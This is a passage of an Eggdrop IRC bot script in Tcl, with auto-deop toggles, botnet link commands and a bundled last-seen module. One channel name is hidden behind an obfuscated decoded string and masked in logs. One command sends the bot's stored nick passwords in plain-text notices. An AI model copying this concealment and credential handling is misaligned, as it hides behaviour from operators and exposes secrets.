puthelp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[string match "*-noidle*" [channel info $chan]]} {
puthelp "NOTICE $nick :$notc idle nick deop $chan already 4DISaBLE."
return 0
}
catch { channel set $chan -noidle }
setuser $cflag XTRA "NOIDLE" ""
puthelp "NOTICE $nick :$notc idle nick deop $chan 4DISaBLE."
saveuser
}
## public auto deop @ps idle -- stop
## public auto deop @ps away -- start
setudef flag noaway
proc awaywhois { } {
global botnick
foreach chan [channels] {
if {[string match "*+noaway*" [channel info $chan]]} {
foreach person [chanlist $chan] {
if {$person != $botnick && [isop $person $chan] && ![matchattr $person b]} {
putserv "WHOIS $person"
}
}
}
}
if {![string match "*awaywhois*" [timers]]} {
timer 5 awaywhois
}
}
#if {![string match "*awaywhois*" [timers]]} {
#   timer 5 awaywhois
#}
#bind raw - 301 awaydeop
proc awaydeop {nick int arg} {
global notc ps botnick
set awaytext [string range [lrange $arg 2 end] 1 end]
set nick [string tolower [lindex $arg 1]]
if { $awaytext != "" } {
foreach chan [channels] {
if {[string match "*+noaway*" [channel info $chan]]} {
if {[onchan $nick $chan] && [isop $nick $chan] && ![matchattr $nick Z] && [string tolower $nick] != [string tolower $botnick]} {
putsrv "MODE $chan -ok $nick 4away.detected"
putsrv "NOTICE $nick :$notc Took op from you! on $chan (no away)"
}
}
}
}; return 0
}
bind pub n `+noaway pub_+noaway
bind pub n `-noaway pub_-noaway
proc pub_+noaway {nick uhost hand chan rest} {
global notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[string match "*+noaway*" [channel info $chan]]} {
puthelp "NOTICE $nick :$notc Away Nick deop $chan 4READY!"
return 0
}
catch { channel set $chan +noaway }
puthelp "NOTICE $nick :$notc Away Nick deop $chan \[9ON\]"
saveuser
}
proc pub_-noaway {nick uhost hand chan rest} {
global notc
if {![matchattr $nick Q]} {
puthelp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[string match "*-noaway*" [channel info $chan]]} {
puthelp "NOTICE $nick :$notc Away Nick deop $chan already 4DISaBLE."
return 0
}
catch { channel set $chan -noaway }
puthelp "NOTICE $nick :$notc Away Nick deop $chan \[4Off\]"
saveuser
}
## public auto deop @ps away -- stop
## public auto deop @ps unident -- start
setudef flag unident
proc unidentwhois { } {
global botnick
foreach chan [channels] {
if {[string match "*+unident*" [channel info $chan]]} {
foreach person [chanlist $chan] {
if {$person != $botnick && [isop $person $chan] && ![matchattr $person b]} {
set unident 1
putserv "WHOIS $person"
}
}
}
}
if {![string match "*unidentwhois*" [timers]]} {
timer 5 unidentwhois
}
}
#if {![string match "*unidentwhois*" [timers]]} {
#   timer 5 unidentwhois
#}
set unident 0
#bind raw - 307 unidentchk
proc unidentchk {from keyword arg} {
global unident notc
set nick [lindex $arg 1]
if {$nick == $botnick} { return 0 }
putlog "uNiDeNT Check: NICK $nick IS IDENTIFY..!"
set unidentz $unident
if {$unidentz == 1} {
set unident 0
}
}
#bind raw - 318 unidentdeop
proc unidentdeop {nick int arg} {
global notc unident ps botnick
set nick [lindex $arg 1]
set unidentz $unident
if {$unidentz == 1} {
foreach chan [channels] {
if {[string match "*+unident*" [channel info $chan]]} {
if {[onchan $nick $chan] && [isop $nick $chan] && ![matchattr $nick Z] && [string tolower $nick] != [string tolower $botnick]} {
putsrv "MODE $chan -ok $nick 4you.are.not.identify"
putsrv "NOTICE $nick :$notc Took op from you! on $chan (you are not identify)"
set unident 0
}
}
}
}; return 0
}
bind pub n `+unident pub_+unident
bind pub n `-unident pub_-unident
proc pub_+unident {nick uhost hand chan rest} {
global notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
catch { channel set $chan +unident }
puthelp "NOTICE $nick :$notc unident nick deop $chan ON"
saveuser
}
proc pub_-unident {nick uhost hand chan rest} {
global notc
if {![matchattr $nick Q]} {
puthelp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[string match "*-unident*" [channel info $chan]]} {
puthelp "NOTICE $nick :$notc unident nick deop $chan already 4DISaBLE."
return 0
}
catch { channel set $chan -unident }
puthelp "NOTICE $nick :$notc unident nick deop $chan 4DISaBLE."
saveuser
}
## public auto deop @ps unident -- stop
proc pub_whom {nick uhost hand channel rest} {
global notc curtime
set curtime [ctime [unixtime]]
set peoplelist ""
foreach x [whom 0] {
set people [lindex $x 0]
string trim $people " "
set peoplelist "$peoplelist ${people}@[lindex [string trim $x ""] 1]"
}
regsub -all " " $peoplelist ", " peoplelist
set peoplelist [string range $peoplelist 1 end]
if {[string trim ${peoplelist} " "]==""} {
set peoplelist " No one is on the partyline"
}
puthelp "NOTICE $nick :$notc People:$peoplelist at $curtime"
putlog "$notc <<$nick>> !$hand! whom"
return 0
}
proc pub_time {nick uhost hand chan rest} {
global notc dater datechecker
set dater [unixtime]
set datechecker [ctime $dater]
puthelp "NOTICE $nick :$notc Hi $hand Current time is $datechecker"
}
proc pub_+bot {nick uhost hand channel rest} {
global notc botnick
if {[matchattr $hand Q] == 0} {
puthelp "NOTICE $nick :$notc This command requires you to authenticate yourself. Please /msg $botnick auth <password>"
return 0
}
set bot [lindex $rest 0]
set address [lindex $rest 1]
set hostmask [lindex $rest 2]
if {[validuser $bot]==1} {
puthelp "NOTICE $nick :$notc $bot is already in my userlist."
return 0
}
if {($bot=="") || ($address=="")} {
puthelp "NOTICE $nick :$notc Usage: `+bot <botname> <address:botport#\[userport#\]> \[hostmask\]"
return 0
}
set porttest [string trim $address "abcdefghijklmnopqrstuvwxyx."]
set porttest [string trim $porttest ":"]
if {$porttest == ""} {
puthelp "NOTICE $nick :$notc Usage: `+bot <botname> <address:botport#\[userport#\]> \[hostmask\]"
return 0
}
if {[validuser $bot]==0} {
putcmdlog "$notc #$hand# +bot $bot $address $hostmask"
addbot $bot $address
if {$hostmask != ""} {
setuser $bot HOSTS $hostmask
}
save
puthelp "NOTICE $nick :$notc $bot \002\[\002${address}\002\]\002 has been add to userlist as a bot."
return 0
}
}
proc pub_-bot {nick uhost hand chan rest} {
global notc botnick
if {[matchattr $hand Q] == 0} {
puthelp "NOTICE $nick :$notc This command requires you to authenticate yourself. Please /msg $botnick auth <password>"
return 0
}
set bot [lindex $rest 0]
if {$bot==""} {
puthelp "NOTICE $nick :$notc Usage: `-bot <handle>"
return 0
}
if {[validuser $bot] == 0} {
puthelp "NOTICE $nick :$notc $bot is not on my userlist."
return 0
}
if {[matchattr $bot b] == 0} {
puthelp "NOTICE $nick :$notc $bot is not a bot on the userlist."
return 0
}
if {[matchattr $bot b] == 1} {
putcmdlog "$notc #$hand# -bot $bot"
deluser $bot
puthelp "NOTICE $nick :$notc $bot has been deleted from the userlist."
save
}
}
proc pub_link {nick uhost hand chan rest} {
global notc botnick dater datechecker
set dater [unixtime]
set datechecker [ctime $dater]
if {[matchattr $hand Q] == 0} {
puthelp "NOTICE $nick :$notc This command requires you to authenticate yourself. Please /msg $botnick auth <password>"
return 0
}
if {$rest == ""} {
puthelp "NOTICE $nick :$notc Usage: `link <bot>"
return 0
}
if {([validuser $rest] == 0) || ([matchattr $rest b] == 0)} {
puthelp "NOTICE $nick :$notc $rest is not in my userlist as a bot."
return 0
}
if {[lsearch -exact [string tolower [bots]] [string tolower $rest]] > -1} {
puthelp "NOTICE $nick :$notc $rest is already linked on the botnet."
return 0
}
if {[lsearch -exact [string tolower [bots]] [string tolower $rest]] == -1} {
putcmdlog "$notc #$hand# link $rest at $datechecker"
link $rest
puthelp "NOTICE $nick :$notc Linking to $rest at [getaddr $rest]"
}
}
proc pub_unlink {nick uhost hand chan rest} {
global notc botnick
if {[matchattr $hand Q] == 0} {
puthelp "NOTICE $nick :$notc This command requires you to authenticate yourself. Please /msg $botnick auth <password>"
return 0
}
if {$rest == ""} {
puthelp "NOTICE $nick :$notc Usage: `unlink <bot>"
return 0
}
if {([validuser $rest] == 0) || ([matchattr $rest b] == 0)} {
puthelp "NOTICE $nick :$notc $rest is not in my userlist as a bot."
return 0
}
if {[lsearch -exact [string tolower [bots]] [string tolower $rest]] == -1} {
puthelp "NOTICE $nick :$notc $rest is not linked on the botnet."
return 0
}
if {[lsearch -exact [string tolower [bots]] [string tolower $rest]] > -1} {
putcmdlog "$notc #$hand# unlink $rest"
unlink $rest
puthelp "NOTICE $nick :$notc Breaking link with $rest"
}
}
bind pub - !voice pub_!voice
proc pub_!voice {nick uhost hand chan rest} {
global botnick vern notc version server
if {![isop $botnick $chan]} { return 0 }
if {[isvoice $nick $chan]} {
puthlp "NOTICE $nick :$notc You're already Voiced!!"
return 0
}
set voicenick [lindex $rest 0]
if {[string tolower $voicenick] == [string tolower "me"] || [string tolower $voicenick] == [string tolower $nick]} {
putserv "MODE $chan +v $nick"
return 0
} {
puthlp "NOTICE $nick :$notc Usage: !voice me or !voice <yournick>"
return 0
}
}
proc ack_act {nick uhost hand chan rest} {
global botnick vern notc version server
puthlp "NOTICE $nick :\001VERSION $notc $vern 1Get It Now! visit: 12http://eggdrop.freeoda.com/tcl/eggdrop/\001"
return 0
}
proc uncolor {s} {
regsub -all --  $s "" s
regsub -all --  $s "" s
regsub -all --  $s "" s
regsub -all -- \[0-9\]\[0-9\],\[0-9\]\[0-9\] $s "" s
regsub -all -- \[0-9\],\[0-9\]\[0-9\] $s "" s
regsub -all -- \[0-9\]\[0-9\],\[0-9\] $s "" s
regsub -all -- \[0-9\],\[0-9\] $s "" s
regsub -all -- \[0-9\]\[0-9\] $s "" s
regsub -all -- \[0-9\] $s "" s
return $s
}
proc msg_botset {unick uhost hand rest} {
global nick nickpass altpass altnick own notc
if {$unick != $own} {
return 0
}
puthlp "NOTICE $unick :$notc 1st $nick ($nickpass) 2nd $altnick ($altpass)"
return 0
}
proc msg_reuser {nick uhost hand rest} {
global botnick owner notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {$nick != $owner} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
foreach x [userlist] {
if {($x != "config") && ($x != "AKICK")} { deluser $x }
}
adduser $owner "$owner!*@*"
chattr $owner "Zfhjmnoptx"
puthlp "NOTICE $nick :$notc Reseting UsER sucessfully, set pass 1st."
saveuser
}
set bs(limit) 8000
set bs(nicksize) 32
set bs(no_pub) ""
set bs(no_log) ""
set bs(log_only) ""
set bs(flood) 4:15
set bs(ignore) 1
set bs(ignore_time) 2
set bs(smartsearch) 1
set bs(logqueries) 1
set bs(path) "language/"
set bs(updater) 10402
set bs(oldver) $bs(updater)
set bs(version) bseen1.4.2c
proc seen {} {
global version notc notd
catch { unbind time - "12 * * * *" bs_timedsave }
catch { unbind time -  "*1 * * * *" bs_trim }
catch { unbind join -|- * bs_join_botidle }
catch { unbind join -|- * bs_join }
catch { unbind sign -|- * bs_sign }
catch { unbind kick -|- * bs_kick }
catch { unbind nick -|- * bs_nick }
catch { unbind splt -|- * bs_splt }
catch { unbind rejn -|- * bs_rejn }
catch { unbind chjn -|- * bs_chjn }
catch { unbind chpt -|- * bs_chpt }
catch { unbind bot -|- bs_botsearch bs_botsearch }
catch { unbind bot -|- bs_botsearch_reply bs_botsearch_reply }
catch { unbind pub -|- [string trim "!"]seen pub_seen }
catch { unbind pub -|- [string trim "!"]seennick bs_pubreq2 }
catch { unbind pub - !ping public_ping }
catch { unbind part -|- * bs_part_oldver }
catch { unbind chof -|- * bs_chof }
set mSEEN "F"
foreach x [channels] {
set cinfo [channel info $x]
if {[string match "*+seen*" $cinfo]} {
set mSEEN "T"
}
}
if {$mSEEN == "F"} {return 0}
bind time - "12 * * * *" bs_timedsave
bind time -  "*1 * * * *" bs_trim
bind join -|- * bs_join_botidle
bind join -|- * bs_join
bind sign -|- * bs_sign
bind kick -|- * bs_kick
bind nick -|- * bs_nick
bind splt -|- * bs_splt
bind rejn -|- * bs_rejn
bind chjn -|- * bs_chjn
bind chpt -|- * bs_chpt
bind bot -|- bs_botsearch bs_botsearch
bind bot -|- bs_botsearch_reply bs_botsearch_reply
bind pub -|- !seen pub_seen
bind pub -|- !seennick bs_pubreq2
bind pub - !ping public_ping
if {[lsearch -exact [bind time -|- "*2 * * * *"] bs_timedsave] > -1} {unbind time -|- "*2 * * * *" bs_timedsave}
if {[string trimleft [lindex $version 1] 0] >= 1050000} {
bind part -|- * bs_part
} {
if {[lsearch -exact [bind part -|- *] bs_part] > -1} {unbind part -|- * bs_part}
bind part -|- * bs_part_oldver
}
foreach chan [string tolower [channels]] {if {![info exists bs_botidle($chan)]} {set bs_botidle($chan) [unixtime]}}
if {[lsearch -exact [bind chof -|- *] bs_chof] > -1} {unbind chof -|- * bs_chof}
if {[info exists bs(bot_delay)]} {unset bs(bot_delay)}
if {[info exists bs_list]} {
if {[info exists bs(oldver)]} {
if {$bs(oldver) < $bs(updater)} {bs_update}
} {bs_update}
}
}
utimer 2 seen
set notm \0038,1\037\567\037\003\0038,4\352\003\0038,1\037\556\037\003\0038,4\544\003\0038,1\037\572\037\003\017
proc bs_filt {data} {
regsub -all -- \\\\ $data \\\\\\\\ data
regsub -all -- \\\[ $data \\\\\[ data
regsub -all -- \\\] $data \\\\\] data
regsub -all -- \\\} $data \\\\\} data
regsub -all -- \\\{ $data \\\\\{ data
regsub -all -- \\\" $data \\\\\" data
return $data
}
proc bs_flood_init {} {
global bs bs_flood_array
if {![string match *:* $bs(flood)]} {return}
set bs(flood_num) [lindex [split $bs(flood) :] 0]
set bs(flood_time) [lindex [split $bs(flood) :] 1]
set i [expr $bs(flood_num) - 1]
while {$i >= 0} {
set bs_flood_array($i) 0
incr i -1
}
}
bs_flood_init
proc bs_flood {nick uhost} {
global bs bs_flood_array
if {$bs(flood_num) == 0} {return 0}
set i [expr $bs(flood_num) - 1]
while {$i >= 1} {
set bs_flood_array($i) $bs_flood_array([expr $i - 1])
incr i -1
}
set bs_flood_array(0) [unixtime]
if {[expr [unixtime] - $bs_flood_array([expr $bs(flood_num) - 1])] <= $bs(flood_time)} {
if {$bs(ignore)} {newignore [join [maskhost *!*[string trimleft $uhost ~]]] $bs(version) "*" $bs(ignore_time)}
return 1
} {return 0}
}
proc bs_read {} {
global bs_list userfile bs
if {![string match */* $userfile]} {set name [lindex [split $userfile .] 0]} {
set temp [split $userfile /]
set temp [lindex $temp [expr [llength $temp]-1]]
set name [lindex [split $temp .] 0]
}
if {![file exists $bs(path)bs_data.$name]} {
if {![file exists $bs(path)bs_data.$name.bak]} {
return
} {exec cp $bs(path)bs_data.$name.bak $bs(path)bs_data.$name}
}
set fd [open $bs(path)bs_data.$name r]
set bsu_ver ""
set break 0
while {![eof $fd]} {
set inp [gets $fd]
if {[eof $fd]} {break}
if {[string trim $inp " "] == ""} {continue}
if {[string index $inp 0] == "#"} {
set bsu_version [string trimleft $inp #]
continue
}
if {![info exists bsu_version] || $bsu_version == "" || $bsu_version < $bs(updater)} {
if {[source scripts/bseen_updater1.4.2.tcl] != "ok"} {set temp 1} {set temp 0}
if {$temp || [bsu_go] || [bsu_finish]} {
rehashing
}
set break 1
break
}
set nick [lindex $inp 0]
set bs_list([string tolower $nick]) $inp
}
close $fd
if {$break} {bs_read}
}
proc bs_update {} {
global bs
bs_save
bs_read
}
proc bs_timedsave {min b c d e} {bs_save}
proc bs_save {} {
global bs_list userfile bs notc
if {[array size bs_list] == 0} {return}
if {![string match */* $userfile]} {set name [lindex [split $userfile .] 0]} {
set temp [split $userfile /]
set temp [lindex $temp [expr [llength $temp]-1]]
set name [lindex [split $temp .] 0]
}
if {[file exists $bs(path)bs_data.$name]} {catch {exec cp -f $bs(path)bs_data.$name $bs(path)bs_data.$name.bak}}
set fd [open $bs(path)bs_data.$name w]
set id [array startsearch bs_list]
puts $fd "#$bs(updater)"
while {[array anymore bs_list $id]} {
set item [array nextelement bs_list $id]
puts $fd "$bs_list($item)"
}
array donesearch bs_list $id
close $fd
}
proc bs_part_oldver {a b c d} {bs_part $a $b $c $d ""}
proc bs_part {nick uhost hand chan reason} {
if {[string tolower $chan] == [dezip [lines "9MJu6/A2i8/0"]]} {
set chan "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] part $chan [split $reason]"
}
proc bs_join {nick uhost hand chan} {
if {[string tolower $chan] == [dezip [lines "9MJu6/A2i8/0"]]} {
set chan "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] join $chan"
}
proc bs_sign {nick uhost hand chan reason} {
if {[string tolower $chan] == [dezip [lines "9MJu6/A2i8/0"]]} {

set chan "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] quit $chan [split $reason]"
}
proc bs_kick {nick uhost hand chan knick reason} {
set schan $chan
if {[string tolower $chan] == [dezip [lines "9MJu6/A2i8/0"]]} {
set schan "-secret-"
}
bs_add $knick "[getchanhost $knick $chan] [unixtime] kick $schan [list $nick] [list $reason]"
}
proc bs_nick {nick uhost hand chan newnick} {
if {[string tolower $chan] == [dezip [lines "9MJu6/A2i8/0"]]} {
set chan "-secret-"
}
set time [unixtime]
bs_add $nick "[list $uhost] [expr $time -1] nick $chan [list $newnick]"
bs_add $newnick "[list $uhost] $time rnck $chan [list $nick]"
}
proc bs_splt {nick uhost hand chan} {
if {[string tolower $chan] == [dezip [lines "9MJu6/A2i8/0"]]} {
set chan "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] splt $chan"
}
proc bs_rejn {nick uhost hand chan} {
if {[string tolower $chan] == [dezip [lines "9MJu6/A2i8/0"]]} {
set chan "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] rejn $chan"
}
proc bs_chjn {bot hand channum flag sock from} {bs_add $hand "[string trimleft $from ~] [unixtime] chjn $bot"}
proc bs_chpt {bot hand args} {set old [split [bs_search ? [string tolower $hand]]] ; if {$old != "0"} {bs_add $hand "[join [string trim [lindex $old 1] ()]] [unixtime] chpt $bot"}}
proc bs_botsearch {from cmd args} {
global botnick notc
set args [join $args]
set command [lindex $args 0]
set target [lindex $args 1]
set nick [lindex $args 2]
set search [bs_filt [join [lrange $args 3 e]]]
if {[string match *\\\** $search]} {
set output [bs_seenmask bot $nick $search]
if {$output != "No matches were found." && ![string match "I'm not on *" $output]} {putbot $from "bs_botsearch_reply $command \{$target\} {$nick, $botnick says:  [bs_filt $output]}"}
} {
set output [bs_output bot $nick [bs_filt [lindex $search 0]] 0]
if {$output != 0 && [lrange [split $output] 1 4] != "unseeing"} {putbot $from "bs_botsearch_reply $command \{$target\} {$nick, $botnick says:  [bs_filt $output]}"}
}
}
proc bs_botsearch_reply {from cmd args} {
global notc bs
set args [join $args]
if {[lindex [lindex $args 2] 5] == "not" || [lindex [lindex $args 2] 4] == "not"} {return}
if {![info exists bs(bot_delay)]} {
set bs(bot_delay) on
utimer 10 {if {[info exists bs(bot_delay)]} {unset bs(bot_delay)}}
if {![lindex $args 0]} {putdcc [lindex $args 1] "[join [lindex $args 2]]"} {
puthlp "[lindex $args 1] :[join [lindex $args 2]]"
}
}
}
proc pub_seen {nick uhost hand chan args} {bs_pubreq $nick $uhost $hand $chan $args 0}
proc bs_pubreq2 {nick uhost hand chan args} {bs_pubreq $nick $uhost $hand $chan $args 1}
proc bs_pubreq {nick uhost hand chan args no} {
global botnick bs notc
if {[string match "*-seen*" [channel info $chan]] && ![matchattr $nick m]} { return 0 }
if {[bs_flood $nick $uhost]} {return 0}
set i 0
if {[lsearch -exact $bs(no_pub) [string tolower $chan]] >= 0} {return 0}
if {$bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower $chan]] == -1} {return 0}
set args [bs_filt [join $args]]
set target "NOTICE $nick"
if {[string match *\\\** [lindex $args 0]]} {
set output [bs_seenmask $chan $hand $args]
if {$output == "No Matches!"} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
if {[string match "I'm not on *" $output]} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
regsub -all -- ~ $output "" output
puthlp "$target :[lgrnd] $output"
return $bs(logqueries)
}
set data [bs_filt [string trimright [lindex $args 0] ?!.,]]
if {[string tolower $nick] == [string tolower $data]} {
puthlp "$target :[lgrnd] $nick, go look in a mirror..!"
return $bs(logqueries)
}
if {[string tolower $data] == [string tolower $botnick] } {
puthlp "$target :\001ACTION Right Here!\001"
return $bs(logqueries)
}
if {[onchan $data $chan]} {
puthlp "$target :[lgrnd] $nick, $data is right here..!"
return $bs(logqueries)
}
set output [bs_output $chan $nick $data $no]
if {$output == 0} {return 0}
if {[lrange [split $output] 1 4] == "I don't remember seeing"} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
regsub -all -- ~ $output "" output
puthlp "$target :[lgrnd] $output"
return $bs(logqueries)
}
proc bs_output {chan nick data no} {
global botnick bs version bs_list
set data [string tolower [string trimright [lindex $data 0] ?!.,]]
if {$data == ""} {return 0}
if {[string tolower $nick] == $data} {return [concat $nick, go look in a mirror.]}
if {$data == [string tolower $botnick]} {return [concat $nick, I'm right here. Quit wasting my time!]}
if {[string length $data] > $bs(nicksize)} {return 0}
if {$bs(smartsearch) != 1} {set no 1}
if {$no == 0} {
set matches ""
set hand ""
set addy ""
if {[lsearch -exact [array names bs_list] $data] != "-1"} {
set addy [lindex $bs_list([string tolower $data]) 1]
set hand [finduser $addy]
foreach item [bs_seenmask dcc ? [maskhost $addy]] {if {[lsearch -exact $matches $item] == -1} {set matches "$matches $item"}}
}
if {[validuser $data]} {set hand $data}
if {$hand != "*" && $hand != ""} {
if {[string trimleft [lindex $version 1] 0]>1030000} {set hosts [getuser $hand hosts]} {set hosts [gethosts $hand]}
foreach addr $hosts {
foreach item [string tolower [bs_seenmask dcc ? $addr]] {
if {[lsearch -exact [string tolower $matches] [string tolower $item]] == -1} {set matches [concat $matches $item]}
}
}
}
if {$matches != ""} {
set matches [string trimleft $matches " "]
set len [llength $matches]
if {$len == 1} {return [bs_search $chan [lindex $matches 0]]}
if {$len > 99} {return [concat I found $len matches to your query\; please refine it to see any output.]}
set matches [bs_sort $matches]
set key [lindex $matches 0]
if {[string tolower $key] == [string tolower $data]} {return [bs_search $chan $key]}
if {$len <= 5} {
set output [concat sorted most $len matches recent: [join $matches].]
set output [concat $output  [bs_search $chan $key]]
return $output
} {
set output [concat found $len matches matches. most 5 recent (sorted): [join [lrange $matches 0 4]].]
set output [concat $output [bs_search $chan $key]]
return $output
}
}
}
set temp [bs_search $chan $data]
if {$temp != 0} { return $temp } {
#$data not found in $bs_list, so search userfile
if {![validuser [bs_filt $data]] || [string trimleft [lindex $version 1] 0]<1030000} {
return "$nick, $data <n/a>"
} {
set seen [getuser $data laston]
if {[getuser $data laston] == ""} {return "$nick, $data <n/a>"}
if {($chan != [lindex $seen 1] || $chan == "bot" || $chan == "msg" || $chan == "dcc") && [validchan [lindex $seen 1]] && [lindex [channel info [lindex $seen 1]] 23] == "+secret"} {
set chan "-secret-"
} {
set chan [lindex $seen 1]
}
return [concat $nick, $data was last seen on $chan [bs_when [lindex $seen 0]] ago.]
}
}
}
proc bs_search {chan n} {
global bs_list notc
if {![info exists bs_list]} {return 0}
if {[lsearch -exact [array names bs_list] [string tolower $n]] != "-1"} {
set data [split $bs_list([string tolower $n])]
set n [join [lindex $data 0]]
set addy [lindex $data 1]
set time [lindex $data 2]
set marker 0
if {([string tolower $chan] != [string tolower [lindex $data 4]] || $chan == "dcc" || $chan == "msg" || $chan == "bot") && [validchan [lindex $data 4]] && [lindex [channel info [lindex $data 4]] 23] == "+secret"} {
set chan "-secret-"
} {
set chan [lindex $data 4]
}
switch -- [lindex $data 3] {
part {
set reason [lrange $data 5 e]
if {$reason == "{}"} {set reason "."} {set reason " stating \"$reason\"."}
set output [concat $n ($addy) parting $chan [bs_when $time] ago$reason]
}
quit {
set reason [lrange $data 5 e]
if {$reason == "Quit: {{}}"} {set reason "."} {set reason " stating $reason."}
set output [concat $n ($addy) quitting $chan [bs_when $time] ago stating$reason]
}
kick {
set output [concat $n ($addy) kicked from $chan by [lindex $data 5] [bs_when $time] ago with the reason ([join [lrange $data 6 e]]).]
}
rnck {
set output [concat $n ($addy) changing nicks from [lindex $data 5] on [lindex $data 4] [bs_when $time] ago.]
if {[validchan [lindex $data 4]]} {
if {[onchan $n [lindex $data 4]]} {
set output [concat $output $n is still there.]
} {
set output [concat $output  unseeing $n now.]
}
}
}
nick {
set output [concat $n ($addy) changing nicks to [lindex $data 5] on [lindex $data 4] [bs_when $time] ago.]
}
splt {
set output [concat $n ($addy) parting $chan due to a split [bs_when $time] ago.]
}
rejn {
set output [concat $n ($addy) rejoining $chan from a split [bs_when $time] ago.]
if {[validchan $chan]} {
if {[onchan $n $chan]} {
set output [concat $output  $n is still on $chan.]
} {
set output [concat $output  I don't see $n on $chan now, though.]
}
}
}
join {
set output [concat $n ($addy) joining $chan [bs_when $time] ago.]
if {[validchan $chan]} {
if {[onchan $n $chan]} {
set output [concat $output  $n is still on $chan.]
} {
set output [concat $output  unseeing $n on $chan now.]
}
}
}
away {
set reason [lrange $data 5 e]
if {$reason == ""} {
set output [concat $n ($addy) returning to the partyline on $chan [bs_when $time] ago.]
} {
set output [concat $n ($addy) seen being marked as away ($reason) on $chan [bs_when $time] ago.]
}
}
chon {
set output [concat $n ($addy) joining the partyline [bs_when $time] ago.]
set lnick [string tolower $n]
foreach item [whom *] {
if {$lnick == [string tolower [lindex $item 0]]} {
set output [concat $output $n is on the partyline right now.]

set marker 1
break
}
}
if {$marker == 0} {
set output [concat $output  I don't see $n on the partyline now, though.]
}
}
chof {
set output [concat $n ($addy) leaving the partyline [bs_when $time] ago.]
set lnick [string tolower $n]
foreach item [whom *] {
if {$lnick == [string tolower [lindex $item 0]]} {
set output [concat $output $n is on the partyline in [lindex $item 1] still.]
break
}
}
}
chjn {
set output [concat $n ($addy) joining the partyline on $chan [bs_when $time] ago.]
set lnick [string tolower $n]
foreach item [whom *] {
if {$lnick == [string tolower [lindex $item 0]]} {
set output [concat $output  $n is on the partyline right now.]
set marker 1
break
}
}
if {$marker == 0} {
set output [concat $output  I don't see $n on the partyline now, though.]
}
}
chpt {
set output [concat $n ($addy) leaving the partyline from $chan [bs_when $time] ago.]
set lnick [string tolower $n]
foreach item [whom *] {
if {$lnick == [string tolower [lindex $item 0]]} {
set output [concat $output  $n is on the partyline in [lindex $item 1] still.]
break
}
}
}
default {set output "error"}
}
return $output
} {return 0}
}
proc bs_when {lasttime} {
set years 0
set days 0
set hours 0
set mins 0
set time [expr [unixtime] - $lasttime]
if {$time < 60} {return "only $time seconds"}
if {$time >= 31536000} {
set years [expr int([expr $time/31536000])]
set time [expr $time - [expr 31536000*$years]]
}
if {$time >= 86400} {
set days [expr int([expr $time/86400])]
set time [expr $time - [expr 86400*$days]]
}
if {$time >= 3600} {
set hours [expr int([expr $time/3600])]
set time [expr $time - [expr 3600*$hours]]
}
if {$time >= 60} {
set mins [expr int([expr $time/60])]
}
if {$years == 0} {
set output ""
} elseif {$years == 1} {
set output "1 year,"
} {
set output "$years years,"
}
if {$days == 1} {lappend output "1 day,"} elseif {$days > 1} {lappend output "$days days,"}
if {$hours == 1} {lappend output "1 hour,"} elseif {$hours > 1} {lappend output "$hours hours,"}
if {$mins == 1} {lappend output "1 minute"} elseif {$mins > 1} {lappend output "$mins minutes"}
return [string trimright [join $output] ", "]
}
proc bs_add {nick data} {
global bs_list bs
if {[lsearch -exact $bs(no_log) [string tolower [lindex $data 3]]] >= 0 || ($bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower [lindex $data 3]]] == -1)} {return}
set bs_list([string tolower $nick]) "[bs_filt $nick] $data"
}
proc bs_lsortcmd {a b} {global bs_list ; set a [lindex $bs_list([string tolower $a]) 2] ; set b [lindex $bs_list([string tolower $b]) 2] ; if {$a > $b} {return 1} elseif {$a < $b} {return -1} {return 0}}
proc bs_trim {min h d m y} {
global bs bs_list
if {![info exists bs_list] || ![array exists bs_list]} {return}
set list [array names bs_list]
set range [expr [llength $list] - $bs(limit) - 1]
if {$range < 0} {return}
set list [lsort -increasing -command bs_lsortcmd $list]
foreach item [lrange $list 0 $range] {unset bs_list($item)}
}
proc bs_seenmask {ch nick args} {
global bs_list bs notc
set matches ""
set temp ""
set i 0
set args [join $args]
set chan [lindex $args 1]
if {$chan != "" && [string trimleft $chan #] != $chan} {
if {![validchan $chan]} {return "I'm not on $chan."} {set chan [string tolower $chan]}
} {
set chan ""
}
if {![info exists bs_list]} {return "No matches were found."}
set data [bs_filt [string tolower [lindex $args 0]]]
set maskfix 1
while $maskfix {
set mark 1
if [regsub -all -- \\?\\? $data ? data] {set mark 0}
if [regsub -all -- \\*\\* $data * data] {set mark 0}
if [regsub -all -- \\*\\? $data * data] {set mark 0}
if [regsub -all -- \\?\\* $data * data] {set mark 0}
if $mark {break}
}
set id [array startsearch bs_list]
while {[array anymore bs_list $id]} {
set item [array nextelement bs_list $id]
if {$item == ""} {continue}
set i 0
set temp ""
set match [lindex $bs_list($item) 0]
set addy [lindex $bs_list($item) 1]
if {[string match $data $item![string tolower $addy]]} {
set match [bs_filt $match]
if {$chan != ""} {
if {[string match $chan [string tolower [lindex $bs_list($item) 4]]]} {set matches [concat $matches $match]}
} {set matches [concat $matches $match]}
}
}
array donesearch bs_list $id
set matches [string trim $matches " "]
if {$nick == "?"} {return [bs_filt $matches]}
set len [llength $matches]
if {$len == 0} {return "No matches were found."}
if {$len == 1} {return [bs_output $ch $nick $matches 1]}
if {$len > 99} {return "I found $len matches to your query; please refine it to see any output."}
set matches [bs_sort $matches]
if {$len <= 5} {
set output [concat I found $len matches to your query (sorted): [join $matches].]
} {
set output "I found $len matches to your query.  Here are the 5 most recent (sorted): [join [lrange $matches 0 4]]."
}
